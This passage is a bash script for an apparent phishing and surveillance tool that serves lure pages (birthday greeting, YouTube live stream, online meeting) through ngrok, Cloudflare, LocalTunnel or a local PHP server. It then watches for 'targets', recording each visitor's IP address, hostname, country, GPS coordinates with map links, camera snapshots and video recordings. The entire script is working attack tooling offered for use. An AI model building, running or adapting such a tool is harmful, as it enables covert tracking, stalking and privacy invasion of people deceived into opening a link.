      elif [[ "$(uname)" == "Darwin" ]]; then
        brew install "${missing[@]}"
      else
        printf "\e[1;91m[!] Please install dependencies manually: %s\e[0m\n" "${missing[*]}"
        exit 1
      fi
      printf "\e[1;92m[✓] Dependencies installed successfully\e[0m\n"
    fi
  else
    printf "\e[1;92m[✓] All dependencies are installed\e[0m\n"
  fi
}

stop() {
  printf "\n\e[1;92m[*] Stopping all processes...\e[0m\n"
  
  # Run auto-merge before stopping
  auto_merge_chunks
  
  if [[ "$windows_mode" == true ]]; then
    taskkill //F //IM "ngrok.exe" 2>/dev/null || true
    taskkill //F //IM "php.exe" 2>/dev/null || true
    taskkill //F //IM "cloudflared.exe" 2>/dev/null || true
    taskkill //F //IM "ssh.exe" 2>/dev/null || true
    taskkill //F //IM "node.exe" 2>/dev/null || true
    printf "\e[1;92m[*] Windows processes stopped\e[0m\n"
  else
    # Kill processes in reverse order of creation
    pkill -f "lt --port" > /dev/null 2>&1 || true
    pkill -f cloudflared > /dev/null 2>&1 || true
    pkill -f ngrok > /dev/null 2>&1 || true
    pkill -f "ssh.*serveo" > /dev/null 2>&1 || true
    pkill -f serveo > /dev/null 2>&1 || true
    pkill -f php > /dev/null 2>&1 || true
    
    # Kill screen sessions
    if command -v screen > /dev/null 2>&1; then
      screen -ls | grep -E "serveo-tunnel|ngrok-tunnel|cloudflared" | cut -d. -f1 | xargs -I {} screen -X -S {} quit 2>/dev/null || true
    fi
    
    if [[ "$termux_mode" == true ]]; then
      pkill -f sshd > /dev/null 2>&1 || true
    fi
    
    printf "\e[1;92m[*] All processes stopped\e[0m\n"
  fi

  printf "\e[1;96m[*] Check saved_videos/final/ for merged videos\e[0m\n"
  printf "\e[1;96m[*] Logs available in: auto_merge.log, Log_finish.log\e[0m\n"
  
  exit 0
}

auto_merge_chunks() {
  printf "\n\e[1;93m[*] Auto-merging orphaned video chunks...\e[0m\n"
  
  if [ -f "saved_videos/merge_handler.php" ]; then
    mkdir -p saved_videos/final 2>/dev/null
    php saved_videos/merge_handler.php "saved_videos" 2>&1 | tee -a auto_merge.log
    
    if [ $? -eq 0 ]; then
      printf "\e[1;92m[✓] Auto-merge completed successfully\e[0m\n"
    else
      printf "\e[1;91m[✗] Auto-merge encountered errors (see auto_merge.log)\e[0m\n"
    fi
  else
    printf "\e[1;93m[!] merge_handler.php not found, skipping auto-merge\e[0m\n"
  fi
}

catch_ip() {
  if [[ ! -f "ip.txt" ]]; then
    return
  fi
  
  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r' || echo "Unknown")
  hostname=$(grep -a 'Hostname:' ip.txt | cut -d " " -f2 | tr -d '\r' || echo "Unknown")
  country=$(grep -a 'Country:' ip.txt | cut -d " " -f2 | tr -d '\r' || echo "Unknown")
  
  printf "\e[1;93m[+] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
  printf "\e[1;93m[+] Hostname:\e[0m\e[1;77m %s\e[0m\n" "$hostname"
  printf "\e[1;93m[+] Country:\e[0m\e[1;77m %s\e[0m\n" "$country"
  
  cat ip.txt >> saved.ip.txt 2>/dev/null || true
}

catch_location() {
  # Check for current_location.txt first
  if [[ -f "current_location.txt" ]]; then
    printf "\e[1;92m[+] Location data received:\e[0m\n"
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt 2>/dev/null || true
    printf "\n"
    mkdir -p saved_locations 2>/dev/null
    mv current_location.txt "saved_locations/location_$(date +%s).txt" 2>/dev/null || true
  fi
  
  # Check saved_locations directory
  if [[ -d "saved_locations" ]] && [[ -n "$(ls -A saved_locations/location_* 2>/dev/null)" ]]; then
    location_file=$(ls -t saved_locations/location_* 2>/dev/null | head -n 1)
    if [[ -f "$location_file" ]]; then
      lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r' || echo "N/A")
      lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r' || echo "N/A")
      acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r' || echo "N/A")
      maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r' || echo "N/A")
      
      printf "\e[1;93m[+] Latitude:\e[0m\e[1;77m %s\e[0m\n" "$lat"
      printf "\e[1;93m[+] Longitude:\e[0m\e[1;77m %s\e[0m\n" "$lon"
      printf "\e[1;93m[+] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" "$acc"
      if [[ "$maps_link" != "N/A" ]]; then
        printf "\e[1;93m[+] Google Maps:\e[0m\e[1;77m %s\e[0m\n" "$maps_link"
      fi
      printf "\e[1;92m[*] Location saved to %s\e[0m\n" "$location_file"
    fi
  fi
}

checkfound() {
  mkdir -p saved_locations 2>/dev/null || true
  mkdir -p saved_videos/uploads 2>/dev/null || true
  mkdir -p saved_videos/final 2>/dev/null || true

  printf "\n"
  printf "\e[1;92m[*] Waiting for targets, Press Ctrl + C to exit...\e[0m\n"
  printf "\e[1;92m[*] Full data capture is \e[0m\e[1;93mACTIVE\e[0m\n"
  printf "\e[1;92m[*] Monitoring: Location | Images | Video Chunks\e[0m\n"
  printf "\e[1;92m[*] Working directory: %s\e[0m\n" "$(pwd)"
  
  while true; do
    # IP detection
    if [[ -f "ip.txt" ]]; then
      printf "\n\e[1;92m[+] Target opened the link!\n"
      catch_ip
      rm -f ip.txt 2>/dev/null || true
    fi

    # Location detection
    if [[ -f "current_location.txt" ]] || [[ -f "LocationLog.log" ]]; then
      printf "\n\e[1;92m[+] Location data received!\e[0m\n"
      catch_location
      rm -f LocationLog.log 2>/dev/null || true
    fi

    # Snapshot detection
    if [[ -f "Log.log" ]]; then
      printf "\n\e[1;92m[+] Camera snapshot received!\e[0m\n"
      rm -f Log.log 2>/dev/null || true
    fi

    # Video chunk detection
    if [[ -f "saved_videos/Log_video.log" ]]; then
      printf "\n\e[1;93m[+] Video chunk received!\e[0m\n"
      rm -f "saved_videos/Log_video.log" 2>/dev/null || true
    fi

    # Final video detection
    if [[ -f "saved_videos/Log_finish.log" ]]; then
      printf "\n\e[1;94m[+] Recording finished! Final video saved.\e[0m\n"
      rm -f "saved_videos/Log_finish.log" 2>/dev/null || true
    fi

    sleep 1
  done 
}

payload_server() {
  link=$1
  printf "\e[1;92m[*] Setting up payload with link: %s\e[0m\n" "$link"
  
  # Create index.php with the forwarding link
  sed "s+forwarding_link+$link+g" template.php > index.php || { 
    printf "\e[1;91m[!] Error creating index.php\e[0m\n" 
    exit 1 
  }
  
  mkdir -p saved_videos/uploads saved_videos/final 2>/dev/null || true
  
  # Copy post.php to saved_videos directory
  if [[ -f "post.php" ]]; then
    cp -f post.php saved_videos/ 2>/dev/null || printf "\e[1;93m[!] Could not copy post.php to saved_videos/\e[0m\n"
  else
    printf "\e[1;91m[!] post.php not found! Place it next to this script.\e[0m\n"
  fi

  # Create template-specific pages
  if [[ ${option_tem} -eq 1 ]]; then
    sed "s+forwarding_link+$link+g" phantomgreet.html > index2.html 2>/dev/null || true
  elif [[ ${option_tem} -eq 2 ]]; then
    sed "s+forwarding_link+$link+g" ytlivestreem.html > index2.html 2>/dev/null || true
  elif [[ ${option_tem} -eq 3 ]]; then
    sed "s+forwarding_link+$link+g" OnlineMeeting.html > index2.html 2>/dev/null || true
  fi

  # Create merge_handler.php if it doesn't exist
  if [[ ! -f "saved_videos/merge_handler.php" ]]; then
    cat > saved_videos/merge_handler.php << 'EOF'
<?php
// Simple merge handler - replace with actual implementation
$dir = isset($argv[1]) ? $argv[1] : '.';
echo "Merging video chunks in: $dir\n";
if (is_dir($dir)) {
    $files = glob("$dir/uploads/*.mp4");
    if (count($files) > 0) {
        echo "Found " . count($files) . " video chunks\n";
        // Add actual merge logic here
        file_put_contents("$dir/final/merged_" . time() . ".txt", 
                         "Video chunks found: " . implode(", ", $files));
    }
}
?>
EOF
  fi
}

select_template() {
  printf "\n-----Choose a template----\n"    
  printf "\n\e[1;92m[01]\e[0m\e[1;93m PhantomGreet Wishing\e[0m\n"
  printf "\e[1;92m[02]\e[0m\e[1;93m Youtube Live Stream \e[0m\n"
  printf "\e[1;92m[03]\e[0m\e[1;93m Online Meeting\e[0m\n"
  
  default_option_template="1"
  read -p $'\n\e[1;92m[+] Choose a template: [Default is 1] \e[0m' option_tem
  option_tem="${option_tem:-${default_option_template}}"
  

  case ${option_tem} in
    1|2|3)
      printf "\e[1;92m[*] Using template option %s\e[0m\n" "$option_tem"
      ;;
    *)
      printf "\e[1;93m[!] Invalid template option! try again\e[0m\n"
      sleep 1
      select_template
      ;;
  esac
}

cloudflare_tunnel() {
  printf "\e[1;92m[*] Setting up Cloudflare Tunnel...\e[0m\n"
  
  # Download cloudflared if needed
  if [[ "$windows_mode" == true ]]; then
    if [[ ! -f "cloudflared.exe" ]]; then
      printf "\e[1;92m[+] Downloading Cloudflared for Windows...\n"
      wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -O cloudflared.exe
      if [[ -f "cloudflared.exe" ]]; then
        chmod +x cloudflared.exe
      else
        printf "\e[1;91m[!] Failed to download cloudflared\e[0m\n"
        return 1
      fi
    fi
    cloudflared_cmd="./cloudflared.exe"
  else
    if [[ ! -f "cloudflared" ]]; then
      printf "\e[1;92m[+] Downloading Cloudflared...\n"
      
      arch=$(uname -m)
      os=$(uname -s | tr '[:upper:]' '[:lower:]')
      
      if [[ "$termux_mode" == true ]]; then
        # Termux - ARM64
        wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O cloudflared
      elif [[ "$os" == "darwin" ]]; then
        # macOS
        if [[ "$arch" == "arm64" ]]; then
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz" -O cloudflared.tgz
          tar -xzf cloudflared.tgz
          mv cloudflared-darwin-arm64 cloudflared
          rm -f cloudflared.tgz
        else
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O cloudflared.tgz
          tar -xzf cloudflared.tgz
          mv cloudflared-darwin-amd64 cloudflared
          rm -f cloudflared.tgz
        fi
      else
        # Linux
        if [[ "$arch" == "x86_64" ]]; then
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -O cloudflared
        elif [[ "$arch" == "aarch64" ]] || [[ "$arch" == "arm64" ]]; then
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O cloudflared
        elif [[ "$arch" == "armv7l" ]]; then
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" -O cloudflared
        else
          # Default to amd64
          wget --no-check-certificate -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -O cloudflared
        fi
      fi
      
      if [[ -f "cloudflared" ]]; then
        chmod +x cloudflared
      else
        printf "\e[1;91m[!] Failed to download cloudflared\e[0m\n"
        return 1
      fi
    fi
    cloudflared_cmd="./cloudflared"
  fi

  printf "\e[1;92m[+] Starting PHP server...\n"
  
  # Start PHP server in background
  if [[ "$termux_mode" == true ]]; then
    php -S 127.0.0.1:3333 -t . > /dev/null 2>&1 &
  else
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  fi
  PHP_PID=$!
  
  sleep 2
  
  printf "\e[1;92m[+] Starting Cloudflared tunnel...\n"
  rm -f .cloudflared.log 2>/dev/null
  
  # Start cloudflared
  $cloudflared_cmd tunnel --url http://localhost:3333 > .cloudflared.log 2>&1 &
  CLOUDFLARED_PID=$!
  
  sleep 12
  
  # Extract link from logs
  link=$(grep -o 'https://[^ ]*\.trycloudflare\.com' ".cloudflared.log" 2>/dev/null | head -n 1)
  
  if [[ -z "$link" ]]; then
    link=$(grep -o 'https://[^ ]*\.cloudflared\.net' ".cloudflared.log" 2>/dev/null | head -n 1)
  fi
  
  if [[ -z "$link" ]]; then
    printf "\e[1;93m[!] Could not extract link automatically\e[0m\n"
    printf "\e[1;92m[*] Check .cloudflared.log for details\e[0m\n"
    printf "\e[1;92m[*] Cloudflared output:\e[0m\n"
    tail -20 .cloudflared.log 2>/dev/null || true
    read -p $'\e[1;92m[*] Enter the Cloudflare URL manually: \e[0m' link
  fi
  
  if [[ -z "$link" ]]; then
    printf "\e[1;91m[!] No valid link obtained\e[0m\n"
    kill $PHP_PID 2>/dev/null || true
    kill $CLOUDFLARED_PID 2>/dev/null || true
    return 1
  fi

  printf "\e[1;92m[✓] Cloudflared URL: \e[0m\e[1;77m%s\e[0m\n" "$link"
  payload_server "$link"
  checkfound
}

ngrok_server() {
  printf "\e[1;92m[*] Setting up Ngrok Tunnel...\e[0m\n"
  
  # Download ngrok if needed
  if [[ "$windows_mode" == true ]]; then
    if [[ ! -f "ngrok.exe" ]]; then
      printf "\e[1;92m[+] Downloading Ngrok for Windows...\n"
      wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -O ngrok.zip
      if [[ -f "ngrok.zip" ]]; then
        unzip -o ngrok.zip > /dev/null 2>&1
        rm -f ngrok.zip
        chmod +x ngrok.exe
      else
        printf "\e[1;91m[!] Failed to download ngrok\e[0m\n"
        return 1
      fi
    fi
    ngrok_cmd="./ngrok.exe"
  else
    if [[ ! -f "ngrok" ]]; then
      printf "\e[1;92m[+] Downloading Ngrok...\n"
      
      arch=$(uname -m)
      os=$(uname -s | tr '[:upper:]' '[:lower:]')
      
      if [[ "$termux_mode" == true ]]; then
        # Termux - ARM64
        wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip" -O ngrok.zip
      elif [[ "$os" == "darwin" ]]; then
        # macOS
        if [[ "$arch" == "arm64" ]]; then
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip" -O ngrok.zip
        else
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip" -O ngrok.zip
        fi
      else
        # Linux
        if [[ "$arch" == "x86_64" ]]; then
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip" -O ngrok.zip
        elif [[ "$arch" == "aarch64" ]] || [[ "$arch" == "arm64" ]]; then
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip" -O ngrok.zip
        elif [[ "$arch" == "armv7l" ]] || [[ "$arch" == "armv6l" ]]; then
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip" -O ngrok.zip
        else
          # Default to amd64
          wget --no-check-certificate -q "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip" -O ngrok.zip
        fi
      fi
      
      if [[ -f "ngrok.zip" ]]; then
        unzip -o ngrok.zip > /dev/null 2>&1
        rm -f ngrok.zip
        chmod +x ngrok
      else
        printf "\e[1;91m[!] Failed to download ngrok\e[0m\n"
        return 1
      fi
    fi
    ngrok_cmd="./ngrok"
  fi

  printf "\e[1;92m[+] Starting PHP server...\n"
  
  # Start PHP server
  if [[ "$termux_mode" == true ]]; then
    php -S 127.0.0.1:3333 -t . > /dev/null 2>&1 &
  else
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  fi
  PHP_PID=$!
  
  sleep 2

  printf "\e[1;92m[+] Starting Ngrok tunnel...\n"
  
  # Start ngrok
  $ngrok_cmd http 3333 > /dev/null 2>&1 &
  NGROK_PID=$!
  
  sleep 10

  # Get ngrok URL from API
  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"[^"]*"' | head -1 | cut -d'"' -f4)
  
  if [[ -z "$link" ]]; then
    printf "\e[1;93m[!] Could not get ngrok URL from API\e[0m\n"
    printf "\e[1;92m[*] Visit http://127.0.0.1:4040 to see ngrok status\n"
    read -p $'\e[1;92m[*] Enter the Ngrok URL manually: \e[0m' link
  fi
  
  if [[ -z "$link" ]]; then
    printf "\e[1;91m[!] No valid link obtained\e[0m\n"
    kill $PHP_PID 2>/dev/null || true
    kill $NGROK_PID 2>/dev/null || true
    return 1
  fi

  printf "\e[1;92m[✓] Ngrok URL: \e[0m\e[1;77m%s\e[0m\n" "$link"
  payload_server "$link"
  checkfound
}

local_php_server() {
  printf "\e[1;92m[*] Setting up Local PHP Server...\e[0m\n"
  
  # Get local IP
  local_ip=$(get_local_ip)
  
  if [[ -z "$local_ip" ]] || [[ "$local_ip" == "127.0.0.1" ]]; then
    printf "\e[1;93m[!] Could not detect local IP address\e[0m\n"
    
    if [[ "$termux_mode" == true ]]; then
      printf "\e[1;92m[*] Termux: Make sure WiFi is connected\n"
      printf "\e[1;92m[*] Run: termux-wifi-connectioninfo\n"
      local_ip="127.0.0.1"
    elif [[ "$kali_mode" == true ]]; then
      printf "\e[1;92m[*] Kali: Check network connection\n"
      printf "\e[1;92m[*] Run: ip addr show\n"
    fi
  fi
  
  printf "\e[1;92m[+] Starting PHP server on %s:3333...\n" "$local_ip"
  
  # Start PHP server
  if [[ "$termux_mode" == true ]]; then
    php -S 0.0.0.0:3333 -t . > /dev/null 2>&1 &
  else
    php -S 0.0.0.0:3333 > /dev/null 2>&1 &
  fi
  PHP_PID=$!
  
  sleep 2
  
  link="http://$local_ip:3333"
  
  if [[ "$local_ip" == "127.0.0.1" ]]; then
    printf "\e[1;93m[!] Warning: Using localhost (127.0.0.1)\e[0m\n"
    printf "\e[1;92m[*] Target must be on the same device to access this link\n"
  else
    printf "\e[1;92m[✓] Local server URL: \e[0m\e[1;77m%s\e[0m\n" "$link"
    printf "\e[1;92m[*] Target must be on the same network\n"
  fi
  
  payload_server "$link"
  checkfound
}

localtunnel_server() {
  printf "\e[1;92m[*] Setting up LocalTunnel...\e[0m\n"
  
  # Check if Node.js and npm are installed
  if ! command -v npm > /dev/null 2>&1; then
    printf "\e[1;93m[!] Node.js/npm not found\e[0m\n"
    
    if [[ "$termux_mode" == true ]]; then
      printf "\e[1;92m[*] Installing Node.js on Termux...\n"
      pkg install -y nodejs
    elif [[ "$kali_mode" == true ]]; then
      printf "\e[1;92m[*] Installing Node.js on Kali...\n"
      sudo apt update && sudo apt install -y nodejs npm
    else
      printf "\e[1;91m[!] Please install Node.js and npm first\e[0m\n"
      return 1
    fi
  fi
  
  # Install localtunnel if not installed
  if ! command -v lt > /dev/null 2>&1; then
    printf "\e[1;92m[+] Installing localtunnel...\n"
    if [[ "$termux_mode" == true ]]; then
      npm install -g localtunnel --unsafe-perm > /dev/null 2>&1
    else
      npm install -g localtunnel > /dev/null 2>&1
    fi
  fi
  
  printf "\e[1;92m[+] Starting PHP server...\n"
  
  # Start PHP server
  if [[ "$termux_mode" == true ]]; then
    php -S 127.0.0.1:3333 -t . > /dev/null 2>&1 &
  else
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  fi
  PHP_PID=$!
  
  sleep 2

  printf "\e[1;92m[+] Starting LocalTunnel...\n"
  
  # Generate random subdomain
  subdomain="phantom$(date +%s)"
  rm -f lt.log 2>/dev/null
  
  # Start localtunnel
  lt --port 3333 --subdomain "$subdomain" > lt.log 2>&1 &
  LT_PID=$!
  
  sleep 10

  # Extract link from logs
  link=$(grep -o "https://$subdomain.loca.lt" lt.log 2>/dev/null | head -n 1)
  
  if [[ -z "$link" ]]; then
    link=$(grep -o 'https://[^"]*\.loca\.lt' lt.log 2>/dev/null | head -n 1)
  fi
  
  if [[ -z "$link" ]]; then
    printf "\e[1;93m[!] Could not extract LocalTunnel URL\e[0m\n"
    printf "\e[1;92m[*] Check lt.log for details\n"
    read -p $'\e[1;92m[*] Enter the LocalTunnel URL manually: \e[0m' link
  fi
  
  if [[ -z "$link" ]]; then
    printf "\e[1;91m[!] No valid link obtained\e[0m\n"
    kill $PHP_PID 2>/dev/null || true
    kill $LT_PID 2>/dev/null || true
    return 1
  fi

  printf "\e[1;92m[✓] LocalTunnel URL: \e[0m\e[1;77m%s\e[0m\n" "$link"
  payload_server "$link"
  checkfound
}

get_local_ip() {
  local local_ip=""
  
  if [[ "$windows_mode" == true ]]; then
    # Windows
    local_ip=$(ipconfig | grep -i "IPv4 Address" | grep -v "192\.168\.137" | head -1 | cut -d: -f2 | tr -d '[:space:]')
  elif [[ "$termux_mode" == true ]]; then
    # Termux/Android
    if command -v termux-wifi-connectioninfo > /dev/null 2>&1; then
      local_ip=$(termux-wifi-connectioninfo | grep -o '"ip":"[^"]*"' | cut -d'"' -f4)
    fi
    
    if [[ -z "$local_ip" ]]; then
      local_ip=$(ip addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    fi
    
    if [[ -z "$local_ip" ]]; then
      local_ip=$(ip route get 1 2>/dev/null | grep -oP 'src \K\S+' | head -1)
    fi
  elif [[ "$kali_mode" == true ]] || [[ -f "/etc/debian_version" ]]; then
    # Kali/Debian Linux
    local_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    
    if [[ -z "$local_ip" ]]; then
      local_ip=$(ip addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    fi
    
    if [[ -z "$local_ip" ]]; then
      local_ip=$(ip addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    fi
  else
    # Other Linux/macOS
    local_ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -1)
  fi
  
  echo "$local_ip"
}

phantomeye() {
  printf "\e[1;92m[*] Cleaning up old files...\e[0m\n"
  rm -rf sendlink 2>/dev/null || true
  rm -f ip.txt current_location.txt LocationLog.log Log.log 2>/dev/null || true

  printf "\n-----Choose tunnel server----\n"    
  printf "\n\e[1;92m[01]\e[0m\e[1;93m Ngrok\e[0m\n"
  printf "\e[1;92m[02]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
  printf "\e[1;92m[03]\e[0m\e[1;93m LocalTunnel\e[0m\n"
  printf "\e[1;92m[04]\e[0m\e[1;93m Local PHP Server (Same Network)\e[0m\n"
  
  default_option_server="2"
  read -p $'\n\e[1;92m[+] Choose a Port Forwarding option: [Default is 2] \e[0m' option_server
  option_server="${option_server:-${default_option_server}}"
  
  select_template

  case $option_server in
    1)
      ngrok_server
      ;;
    2)
      cloudflare_tunnel
      ;;
    3)
      localtunnel_server
      ;;
    4)
      local_php_server
      ;;
    *)
      printf "\e[1;91m[!] Invalid option selected\e[0m\n"
      sleep 1
      clear
      banner
      phantomeye
      ;;
  esac
}

# Main execution
main() {
  detect_platform
  banner
  dependencies
  phantomeye
}

# Set up trap for cleanup
trap 'stop' INT TERM

# Run main function

main

